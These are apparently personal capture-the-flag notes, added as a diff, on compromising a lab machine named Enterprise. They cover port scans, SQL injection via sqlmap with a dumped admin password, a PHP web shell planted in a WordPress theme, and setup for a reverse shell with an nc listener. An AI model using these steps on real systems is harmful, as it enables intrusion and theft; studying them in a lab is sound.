@@ -1,0 +1,172 @@
+1. nmap the box
+ nmap -sC -sV -oA nmap/enterprise 10.10.10.61
+
+ -sC == run default scripts
+ -sV == enumerate versions 
+ -oA == output results in all formats 
+
+ 22/tcp   open  ssh      OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
+|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
+|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519)
+80/tcp   open  http     Apache httpd 2.4.10 ((Debian))
+|_http-generator: WordPress 4.8.1
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: USS Enterprise &#8211; Ships Log
+443/tcp  open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
+|_http-server-header: Apache/2.4.25 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
+| Not valid before: 2017-08-25T10:35:14
+|_Not valid after:  2017-09-24T10:35:14
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+8080/tcp open  http     Apache httpd 2.4.10 ((Debian))
+|_http-generator: Joomla! - Open Source Content Management
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Interesting: 
+- different versions of Apache running: 
+-- 80 and 8080 Apache/2.4.10 (Debian)
+-- 443 Apache httpd 2.4.25 ((Ubuntu))
+
+2. Checking out the cert on https://
+- get the following email from the cert: 
+jeanlucpicard@enterprise.local this could be an ssh user 
+
+3. updating hosts to resolve enterprise.local
+10.10.10.61     enterprise.local
+
+4. checking out 8080 Joomla 
+Ten Forward	
+
+5. checking out 80
+Page looks gnarly looking at source 
+All links are heading to http://enterprise.htb
+updating hosts file again
+site is now way less terrible 
+
+Posts are made by william.riker [another user poss.]
+
+6. running gobuster
+against https: 
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.61/ -k
+
+-k == skip SSL cert verification 
+
+Gobuster finds: 
+https://10.10.10.61/files/ 
+Downloading lcars.zip
+
+unzip lcars.zip     
+Archive:  lcars.zip
+  inflating: lcars/lcars_db.php      
+  inflating: lcars/lcars_dbpost.php  
+  inflating: lcars/lcars.php  
+
+7. run wp-scan 
+wpscan --url http://10.10.10.61 --enumerate u,ap,tt,t   
+
+u == users
+ap == all plugins
+tt == timthumbs
+t == themes
+
+8. running JoomScan and Joomlavs
+results in joomla-scan and joomlavs-results 
+
+Joomlavs command: /usr/share/joomlavs/joomlavs.rb -u http://10.10.10.61 -a | tee joomlavs-results
+Joomscan command: joomscan --url http://10.10.10.150 -ec | tee joomla-scan.out
+
+9. looking at contents of lcars.zip
+
+lcars.php == another user Geordi La Forge
+lcars_dbpost.php == sql does not seem to be vuln because they do declair an int with the query
+lcars_db.php ==  $query = $_GET['query']; (no int set here)
+
+looking for the plugin on the wordpress site itself
+http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php
+Results in "Failed to read query" expected
+
+exploiting this line: $sql = "SELECT ID FROM wp_posts WHERE post_name = $query";
+http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1
+returns this error: 
+Catchable fatal error: 
+Object of class mysqli_result could not be converted to string in /var/www/html/wp-content/plugins/lcars/lcars_db.php on line 16
+
+Using SQLMap to exploit this
+
+10. sqlmap 
+- pull this request out of burp and save it as query.req 
+
+GET /wp-content/plugins/lcars/lcars_db.php?query=1 HTTP/1.1
+Host: 10.10.10.61
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: 14cd8f365a67fad648754407628a1809=603861d55eed1723ec7b8876a1ab112a
+Upgrade-Insecure-Requests: 1
+
+sqlmap finds that it is injectable so running sqlmap -r query-sql.req --dbms mysql --dump-all 
+because I goofed during the init run to dump the db 
+
+Db dump of wp_posts shows a passwords in the db
+u*Z14ru0p#ttj83zS6 is the password for the wp-admin as riker 
+
+11. now that I am logged in seeing if I can create a template file 
+http://enterprise.htb/wp-admin/theme-editor.php
+
+editing the theme header 
+echo system($_REQUEST['alwaysbetesting']);
+
+update the file
+view-source:http://10.10.10.61/?alwaysbetesting=ls
+
+index.php
+license.txt
+readme.html
+sqlShell.php
+wp-activate.php
+wp-admin
+wp-blog-header.php
+wp-comments-post.php
+wp-config-sample.php
+wp-config.php
+wp-content
+wp-cron.php
+wp-includes
+wp-links-opml.php
+wp-load.php
+wp-login.php
+wp-mail.php
+wp-settings.php
+wp-signup.php
+wp-trackback.php
+xmlrpc.php
+xmlrpc.php
+
+using php-reverse-shell.php
+
+┌──(kali㉿kali)-[~/…/JvP-prep/wordpress/enterprise/www]
+└─$ python -m SimpleHTTPServer 80                                                                                                                1 ⚙
+Serving HTTP on 0.0.0.0 port 80 ...
+
+setup a listener: 
+┌──(kali㉿kali)-[~/CTF/JvP-prep/wordpress/enterprise]
+└─$ nc -lvnp 9001
+listening on [any] 9001 ...
+
+
+use curl to pull the shell over 
